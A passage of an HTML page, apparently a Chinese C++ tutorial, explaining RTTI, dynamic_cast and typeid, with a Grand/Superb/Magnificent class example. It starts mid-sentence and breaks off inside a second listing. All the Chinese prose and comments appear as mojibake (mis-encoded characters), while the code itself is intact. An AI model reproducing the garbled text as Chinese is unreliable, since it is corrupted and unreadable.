ä¸­ä¸€ä¸ªå¼ºå¤§çš„é”™è¯¯å¤„ç†å·¥å…·ï¼Œä½†ä¹Ÿéœ€è¦è°¨æ…ä½¿ç”¨ï¼Œå¹¶ç»“åˆ RAII ç­‰æŠ€æœ¯æ¥ç¡®ä¿ç¨‹åºçš„å¥å£®æ€§å’Œèµ„æºçš„æ­£ç¡®ç®¡ç†ã€‚</p><h2 id="15-4-RTTIï¼ˆè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼‰"><a href="#15-4-RTTIï¼ˆè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼‰" class="headerlink" title="15.4 RTTIï¼ˆè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼‰"></a>15.4 RTTIï¼ˆè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼‰</h2><p><strong>RTTI</strong> æ˜¯ <strong>Runtime Type Identification</strong> çš„ç¼©å†™ï¼Œå³<strong>è¿è¡Œæ—¶ç±»å‹è¯†åˆ«</strong>ã€‚å®ƒæ˜¯ C++ çš„ä¸€é¡¹æœºåˆ¶ï¼Œå…è®¸ç¨‹åºåœ¨<strong>è¿è¡Œæ—¶</strong>å‘ç°å’Œä½¿ç”¨å¯¹è±¡çš„<strong>å®é™…ç±»å‹ä¿¡æ¯</strong>ã€‚</p><p>é€šå¸¸ï¼Œæˆ‘ä»¬é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥æ“ä½œæ´¾ç”Ÿç±»å¯¹è±¡ï¼ˆå¤šæ€ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç åªå…³å¿ƒå¯¹è±¡æ˜¯å¦ç¬¦åˆåŸºç±»å®šä¹‰çš„æ¥å£ã€‚ä½†æœ‰æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦çŸ¥é“æŒ‡é’ˆæˆ–å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡çš„<strong>ç¡®åˆ‡æ´¾ç”Ÿç±»å‹</strong>ï¼Œä»¥ä¾¿æ‰§è¡Œè¯¥æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ“ä½œã€‚RTTI å°±æ˜¯ä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜è€Œè®¾è®¡çš„ã€‚</p><p>RTTI ä¸»è¦é€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªå…ƒç´ å®ç°ï¼š</p><ol><li> <strong><code>dynamic_cast&lt;&gt;</code> è¿ç®—ç¬¦:</strong> ç”¨äºåœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œ**å®‰å…¨çš„å‘ä¸‹è½¬æ¢ (Downcasting)**ã€‚å®ƒå¯ä»¥å°†åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå¹¶åœ¨è½¬æ¢æ— æ•ˆæ—¶æä¾›æ˜ç¡®çš„å¤±è´¥æŒ‡ç¤ºã€‚</li><li> <strong><code>typeid()</code> è¿ç®—ç¬¦:</strong> è¿”å›ä¸€ä¸ªæŒ‡å‘ <code>std::type_info</code> å¯¹è±¡çš„å¼•ç”¨ï¼Œè¯¥å¯¹è±¡åŒ…å«äº†å…³äºæ“ä½œæ•°ç±»å‹çš„ä¿¡æ¯ï¼ˆå¦‚ç±»å‹åç§°ï¼‰ã€‚</li><li> <strong><code>std::type_info</code> ç±»:</strong> å­˜å‚¨ç‰¹å®šç±»å‹ä¿¡æ¯çš„ç±»ã€‚å…¶å…·ä½“å†…å®¹å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œä½†æ ‡å‡†ä¿è¯å®ƒæœ‰ä¸€ä¸ª <code>name()</code> æ–¹æ³•è¿”å›ç±»å‹çš„åç§°å­—ç¬¦ä¸²ï¼Œå¹¶å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª <code>type_info</code> å¯¹è±¡æ˜¯å¦ç›¸ç­‰ã€‚</li></ol><p><strong>æ³¨æ„:</strong> RTTI ä¸»è¦ç”¨äº<strong>å…·æœ‰è™šå‡½æ•°</strong>çš„ç±»å±‚æ¬¡ç»“æ„ï¼ˆå³å¤šæ€ç±»ï¼‰ã€‚å¯¹äºæ²¡æœ‰è™šå‡½æ•°çš„ç±»ï¼ŒRTTI çš„åŠŸèƒ½ä¼šå—åˆ°é™åˆ¶ï¼ˆç‰¹åˆ«æ˜¯ <code>dynamic_cast</code> å¯¹æŒ‡é’ˆçš„æ“ä½œå’Œ <code>typeid</code> å¯¹è§£å¼•ç”¨æŒ‡é’ˆçš„æ“ä½œï¼‰ã€‚ç¼–è¯‘å™¨é€šå¸¸é€šè¿‡è™šå‡½æ•°è¡¨ (vtable) æ¥å­˜å‚¨ RTTI æ‰€éœ€çš„ä¿¡æ¯ã€‚</p><h3 id="15-4-1-RTTI-çš„ç”¨é€”"><a href="#15-4-1-RTTI-çš„ç”¨é€”" class="headerlink" title="15.4.1 RTTI çš„ç”¨é€”"></a>15.4.1 RTTI çš„ç”¨é€”</h3><p>RTTI ä¸»è¦ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p><ul><li>  <strong>å®‰å…¨çš„å‘ä¸‹è½¬æ¢:</strong> å½“ä½ æœ‰ä¸€ä¸ªåŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå¹¶ä¸”ä½ æ€€ç–‘å®ƒå¯èƒ½æŒ‡å‘æŸä¸ªç‰¹å®šçš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½ æƒ³å®‰å…¨åœ°å°†å…¶è½¬æ¢ä¸ºè¯¥æ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä»¥ä¾¿è°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•ã€‚</li><li>  <strong>ç±»å‹ç›¸å…³çš„ç‰¹æ®Šå¤„ç†:</strong> æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹æ‰§è¡Œä¸åŒçš„é€»è¾‘åˆ†æ”¯ã€‚</li></ul><p><strong>æ›¿ä»£æ–¹æ¡ˆ:</strong> åº”è¯¥ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨<strong>è™šå‡½æ•°</strong>æ¥å®ç°å¤šæ€è¡Œä¸ºã€‚å¦‚æœä¸åŒçš„æ´¾ç”Ÿç±»éœ€è¦ä»¥ä¸åŒçš„æ–¹å¼æ‰§è¡ŒæŸä¸ªæ“ä½œï¼Œé€šå¸¸æ›´å¥½çš„è®¾è®¡æ˜¯å®šä¹‰ä¸€ä¸ªè™šå‡½æ•°ï¼Œè®©æ¯ä¸ªæ´¾ç”Ÿç±»æä¾›è‡ªå·±çš„å®ç°ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ RTTI æ¥åˆ¤æ–­ç±»å‹å¹¶æ‰‹åŠ¨è°ƒç”¨ä¸åŒçš„ä»£ç ã€‚RTTI å¾€å¾€è¢«è§†ä¸ºä¸€ç§æœ€åçš„æ‰‹æ®µï¼Œæˆ–è€…åœ¨ç‰¹å®šæ¡†æ¶ï¼ˆå¦‚å›¾å½¢ç•Œé¢åº“ä¸­çš„äº‹ä»¶å¤„ç†ï¼‰ä¸­å¯èƒ½æ›´å¸¸ç”¨ã€‚è¿‡åº¦ä½¿ç”¨ RTTI å¯èƒ½è¡¨æ˜ç±»è®¾è®¡å­˜åœ¨é—®é¢˜ã€‚</p><h3 id="15-4-2-RTTI-çš„å·¥ä½œåŸç†"><a href="#15-4-2-RTTI-çš„å·¥ä½œåŸç†" class="headerlink" title="15.4.2 RTTI çš„å·¥ä½œåŸç†"></a>15.4.2 RTTI çš„å·¥ä½œåŸç†</h3><h4 id="1-dynamic-cast-lt-gt-è¿ç®—ç¬¦"><a href="#1-dynamic-cast-lt-gt-è¿ç®—ç¬¦" class="headerlink" title="1. dynamic_cast&lt;&gt; è¿ç®—ç¬¦"></a>1. <code>dynamic_cast&lt;&gt;</code> è¿ç®—ç¬¦</h4><p><code>dynamic_cast</code> ç”¨äºåœ¨ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œç±»å‹è½¬æ¢ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡Œæ—¶æ£€æŸ¥è½¬æ¢çš„æœ‰æ•ˆæ€§ã€‚</p><p><strong>è¯­æ³•:</strong></p><ul><li>  <strong>æŒ‡é’ˆè½¬æ¢:</strong> <code>dynamic_cast&lt;TargetType*&gt;(source_pointer)</code></li><li>  <strong>å¼•ç”¨è½¬æ¢:</strong> <code>dynamic_cast&lt;TargetType&amp;&gt;(source_reference)</code></li></ul><p><strong>è¡Œä¸º:</strong></p><ul><li>  <strong>å‘ä¸Šè½¬æ¢ (Upcasting):</strong> å°†æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ã€‚<code>dynamic_cast</code> å¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Œä½†é€šå¸¸ä¸éœ€è¦ï¼Œå› ä¸ºéšå¼è½¬æ¢å³å¯ã€‚</li><li><strong>å‘ä¸‹è½¬æ¢ (Downcasting):</strong> å°†åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ã€‚è¿™æ˜¯ <code>dynamic_cast</code> çš„ä¸»è¦ç”¨é€”ã€‚<ul><li>  <strong>å‰æ:</strong> åŸºç±»<strong>å¿…é¡»</strong>åŒ…å«è‡³å°‘ä¸€ä¸ªè™šå‡½æ•°ï¼ˆå³æ˜¯å¤šæ€åŸºç±»ï¼‰ï¼Œ<code>dynamic_cast</code> æ‰èƒ½æ‰§è¡Œè¿è¡Œæ—¶çš„å‘ä¸‹è½¬æ¢æ£€æŸ¥ã€‚å¦‚æœåŸºç±»æ²¡æœ‰è™šå‡½æ•°ï¼Œ<code>dynamic_cast</code> ç”¨äºå‘ä¸‹è½¬æ¢æ—¶é€šå¸¸ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼ˆæˆ–è¡Œä¸ºç±»ä¼¼ <code>static_cast</code>ï¼Œä¸å®‰å…¨ï¼‰ã€‚</li><li><strong>æŒ‡é’ˆè½¬æ¢:</strong><ul><li>  å¦‚æœ <code>source_pointer</code> ç¡®å®æŒ‡å‘ä¸€ä¸ª <code>TargetType</code> ç±»å‹çš„å¯¹è±¡ï¼ˆæˆ–è€…æ˜¯ <code>TargetType</code> çš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œåˆ™è½¬æ¢æˆåŠŸï¼Œè¿”å›æŒ‡å‘è¯¥å¯¹è±¡çš„ <code>TargetType*</code> æŒ‡é’ˆã€‚</li><li>  å¦‚æœ <code>source_pointer</code> æŒ‡å‘çš„å¯¹è±¡<strong>ä¸æ˜¯</strong> <code>TargetType</code> ç±»å‹ï¼ˆæˆ–å…¶æ´¾ç”Ÿç±»ï¼‰ï¼Œæˆ–è€… <code>source_pointer</code> æ˜¯ <code>nullptr</code>ï¼Œåˆ™è½¬æ¢å¤±è´¥ï¼Œè¿”å› **<code>nullptr</code>**ã€‚</li></ul></li><li><strong>å¼•ç”¨è½¬æ¢:</strong><ul><li>  å¦‚æœ <code>source_reference</code> ç¡®å®å¼•ç”¨ä¸€ä¸ª <code>TargetType</code> ç±»å‹çš„å¯¹è±¡ï¼ˆæˆ–è€…æ˜¯ <code>TargetType</code> çš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œåˆ™è½¬æ¢æˆåŠŸï¼Œè¿”å›å¯¹è¯¥å¯¹è±¡çš„ <code>TargetType&amp;</code> å¼•ç”¨ã€‚</li><li>  å¦‚æœ <code>source_reference</code> å¼•ç”¨çš„å¯¹è±¡<strong>ä¸æ˜¯</strong> <code>TargetType</code> ç±»å‹ï¼ˆæˆ–å…¶æ´¾ç”Ÿç±»ï¼‰ï¼Œåˆ™è½¬æ¢å¤±è´¥ï¼ŒæŠ›å‡º <strong><code>std::bad_cast</code> å¼‚å¸¸</strong>ï¼ˆå®šä¹‰åœ¨ <code>&lt;typeinfo&gt;</code> ä¸­ï¼‰ã€‚</li></ul></li></ul></li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for rand(), srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // for time()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // for bad_cast</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // for exception</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grand</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hold;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Grand(<span class="keyword">int</span> h = <span class="number">0</span>) : hold(h) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a grand class!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Value</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hold; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Grand() &#123;&#125; <span class="comment">// è™šææ„å‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Superb</span> :</span> <span class="keyword">public</span> Grand &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Superb(<span class="keyword">int</span> h = <span class="number">0</span>) : Grand(h) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a superb class!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Say</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I hold the superb value of &quot;</span> &lt;&lt; Value() &lt;&lt; <span class="string">&quot;!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Magnificent</span> :</span> <span class="keyword">public</span> Superb &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Magnificent(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">char</span> c = <span class="string">&#x27;A&#x27;</span>) : Superb(h), ch(c) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Speak</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a magnificent class!!!\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Say</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I hold the magnificent value of &quot;</span> &lt;&lt; Value() &lt;&lt; <span class="string">&quot; and the character &quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šéšæœºç”Ÿæˆä¸€ä¸ªæŒ‡å‘ Grand, Superb æˆ– Magnificent å¯¹è±¡çš„æŒ‡é’ˆ</span></span><br><span class="line"><span class="function">Grand * <span class="title">GetOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Grand * p = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">std</span>::rand() % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: p = <span class="keyword">new</span> Grand(<span class="built_in">std</span>::rand() % <span class="number">100</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: p = <span class="keyword">new</span> Superb(<span class="built_in">std</span>::rand() % <span class="number">100</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: p = <span class="keyword">new</span> Magnificent(<span class="built_in">std</span>::rand() % <span class="number">100</span>, <span class="string">&#x27;A&#x27;</span> + <span class="built_in">std</span>::rand() % <span class="number">26</span>); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line">    Grand * pg;</span><br><span class="line">    Superb * ps;</span><br><span class="line">    Magnificent * pm;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        pg = GetOne(); <span class="comment">// è·å–ä¸€ä¸ªéšæœºç±»å‹çš„å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now processing type #&quot;</span> &lt;&lt; i+<span class="number">1</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        pg-&gt;Speak(); <span class="comment">// è°ƒç”¨è™šå‡½æ•°ï¼Œæ€»æ˜¯æ­£ç¡®çš„</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°è¯•å‘ä¸‹è½¬æ¢ä¸º Superb*</span></span><br><span class="line">        ps = <span class="keyword">dynamic_cast</span>&lt;Superb *&gt;(pg);</span><br><span class="line">        <span class="keyword">if</span> (ps != <span class="literal">nullptr</span>) &#123; <span class="comment">// æ£€æŸ¥è½¬æ¢æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">            ps-&gt;Say(); <span class="comment">// å¦‚æœæ˜¯ Superb æˆ– Magnificentï¼Œå¯ä»¥è°ƒç”¨ Say()</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; (Not a Superb or derived type)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°è¯•å‘ä¸‹è½¬æ¢ä¸º Magnificent*</span></span><br><span class="line">        pm = <span class="keyword">dynamic_cast</span>&lt;Magnificent *&gt;(pg);</span><br><span class="line">        <span class="keyword">if</span> (pm != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">             <span class="comment">// å¦‚æœæ˜¯ Magnificentï¼Œå¯ä»¥è°ƒç”¨ Say() (è¿™é‡Œä¼šè°ƒç”¨ Magnificent çš„ç‰ˆæœ¬)</span></span><br><span class="line">             <span class="comment">// pm-&gt;Say(); // å¯ä»¥è°ƒç”¨ï¼Œä½†ä¸Šé¢ Superb* çš„ Say() å·²ç»è°ƒç”¨è¿‡äº†</span></span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;   (Also a Magnificent type)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°è¯•ä½¿ç”¨å¼•ç”¨è½¬æ¢ (å¦‚æœå¤±è´¥ä¼šæŠ›å¼‚å¸¸)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Superb &amp; rs = <span class="keyword">dynamic_cast</span>&lt;Superb &amp;&gt;(*pg); <span class="comment">// å°è¯•è½¬æ¢ä¸º Superb å¼•ç”¨</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Reference cast to Superb successful.\n&quot;</span>;</span><br><span class="line">            <span class="comment">// rs.Say(); // å¯ä»¥è°ƒç”¨</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_cast &amp; bc) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Reference cast to Superb failed: &quot;</span> &lt;&lt; bc.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> pg; <span class="comment">// æ¸…ç†å†…å­˜ (éœ€è¦è™šææ„å‡½æ•°)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-typeid-è¿ç®—ç¬¦"><a href="#2-typeid-è¿ç®—ç¬¦" class="headerlink" title="2. typeid() è¿ç®—ç¬¦"></a>2. <code>typeid()</code> è¿ç®—ç¬¦</h4><p><code>typeid</code> è¿ç®—ç¬¦è¿”å›ä¸€ä¸ª <code>const std::type_info&amp;</code> å¯¹è±¡ï¼Œè¡¨ç¤ºå…¶æ“ä½œæ•°çš„ç±»å‹ã€‚</p><p><strong>è¯­æ³•:</strong></p><ul><li>  <code>typeid(expression)</code>: è¿”å›è¡¨è¾¾å¼ <code>expression</code> çš„<strong>è¿è¡Œæ—¶</strong>ç±»å‹ä¿¡æ¯ï¼ˆå¦‚æœè¡¨è¾¾å¼æ˜¯è§£å¼•ç”¨çš„å¤šæ€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚å¦‚æœè¡¨è¾¾å¼ä¸æ˜¯å¤šæ€ç±»å‹ï¼Œåˆ™è¿”å›å…¶<strong>é™æ€</strong>ç±»å‹ä¿¡æ¯ã€‚</li><li>  <code>typeid(type-name)</code>: è¿”å›ç±»å‹ <code>type-name</code> çš„ç±»å‹ä¿¡æ¯ã€‚</li></ul><p><strong><code>std::type_info</code> ç±»:</strong></p><ul><li>  <strong><code>name()</code>:</strong> è¿”å›ä¸€ä¸ªå®ç°å®šä¹‰çš„ C é£æ ¼å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç±»å‹çš„åç§°ã€‚åç§°çš„å…·ä½“æ ¼å¼ï¼ˆä¾‹å¦‚æ˜¯å¦åŒ…å«å‘½åç©ºé—´ã€æ˜¯å¦ç»è¿‡â€œä¿®é¥°â€/mangledï¼‰æ²¡æœ‰ç»Ÿä¸€æ ‡å‡†ã€‚</li><li>  <strong><code>operator==</code>:</strong> å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª <code>type_info</code> å¯¹è±¡æ˜¯å¦ä»£è¡¨åŒä¸€ç±»å‹ã€‚</li><li>  <strong><code>operator!=</code>:</strong> å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª <code>type_info</code> å¯¹è±¡æ˜¯å¦ä»£è¡¨ä¸åŒç±»å‹ã€‚</li><li>  <strong><code>before()</code>:</strong> ç”¨äºç¡®å®šä¸€ä¸ªç±»å‹åœ¨ç¼–è¯‘å™¨çš„å†…éƒ¨æ’åºé¡ºåºä¸­æ˜¯å¦ä½äºå¦ä¸€ä¸ªç±»å‹ä¹‹å‰ï¼ˆç”¨é€”è¾ƒå°‘ï¼‰ã€‚</li></ul><p><strong>æ³¨æ„:</strong></p><ul><li>  è¦ä½¿ç”¨ <code>typeid</code> å’Œ <code>type_info</code>ï¼Œéœ€è¦åŒ…å« <code>&lt;typeinfo&gt;</code> å¤´æ–‡ä»¶ã€‚</li><li>  å¦‚æœ <code>typeid</code> çš„æ“ä½œæ•°æ˜¯ä¸€ä¸ª**ç©ºæŒ‡é’ˆ (nullptr)**ï¼Œå®ƒä¼šæŠ›å‡º <code>std::bad_typeid</code> å¼‚å¸¸ã€‚</li><li>  å¦‚æœ <code>typeid</code> ç”¨äºéå¤šæ€ç±»å‹ï¼ˆæ²¡æœ‰è™šå‡½æ•°ï¼‰çš„æŒ‡é’ˆè§£å¼•ç”¨ï¼Œå®ƒè¿”å›çš„æ˜¯æŒ‡é’ˆçš„<strong>é™æ€ç±»å‹</strong>ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å®é™…æŒ‡å‘å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // for typeid, type_info</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ä¸Šé¢å®šä¹‰çš„ Grand, Superb, Magnificent ç±»å’Œ GetOne() å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line">    Grand * pg = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span 